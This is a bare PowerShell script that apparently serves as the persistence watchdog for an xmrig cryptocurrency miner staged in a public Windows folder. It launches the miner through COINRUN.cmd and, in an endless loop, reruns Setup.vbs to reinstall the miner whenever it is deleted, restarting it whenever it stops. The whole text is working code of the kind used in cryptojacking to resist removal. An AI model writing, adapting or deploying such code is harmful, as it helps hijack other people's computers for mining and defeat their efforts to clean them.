$xmrigPath = "C:\Users\Public\Downloads\xmrig-6.22.2\xmrig.exe"
$setupPath = "C:\Users\Public\Downloads\Setup.vbs"
$coinRunPath = "C:\Users\Public\Downloads\xmrig-6.22.2\COINRUN.cmd"

function Is-XmrigRunning {
    return (Get-Process | Where-Object { $_.Path -eq $xmrigPath }) -ne $null
}

function Start-CoinRun {
    if (Is-XmrigRunning) {
        Write-Host "xmrig.exe Running. STOP"
        return
    }

    $global:coinRunProcess = Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$coinRunPath`"" -PassThru
    Write-Host "Running coinrun.cmd"
}


if (Test-Path $xmrigPath) {
    Start-CoinRun
} else {
    Write-Warning "xmrig.exe NOT. RUN Setup.vbs..."
    if (Test-Path $setupPath) {
        Start-Process -FilePath "wscript.exe" -ArgumentList "`"$setupPath`""
        Write-Host "Running Setup.vbs"

        while (!(Test-Path $xmrigPath)) {
            Write-Host "Wait xmrig.exe..."
            Start-Sleep -Seconds 3
        }

        Start-CoinRun
    } else {
        Write-Error "NOT Setup.vbs"
    }
}


while ($true) {
    if (!(Test-Path $xmrigPath)) {
        Write-Warning "xmrig.exe DEL. Run Setup.vbs..."

        if (Test-Path $setupPath) {
            Start-Process -FilePath "wscript.exe" -ArgumentList "`"$setupPath`""
            Write-Host "RUN Setup.vbs"

            while (!(Test-Path $xmrigPath)) {
                Write-Host "Wait xmrig.exe..."
                Start-Sleep -Seconds 3
            }

            Start-CoinRun
        } else {
            Write-Error "NOT Setup.vbs $setupPath"
        }
    }


    if ($global:coinRunProcess -and $global:coinRunProcess.HasExited) {
        Write-Warning "coinrun.cmd STOPPED. Checking xmrig status..."
        Start-CoinRun
    } elseif ($global:coinRunProcess) {
        Write-Host "coinrun.cmd running..."
    }

    Start-Sleep -Seconds 3
}
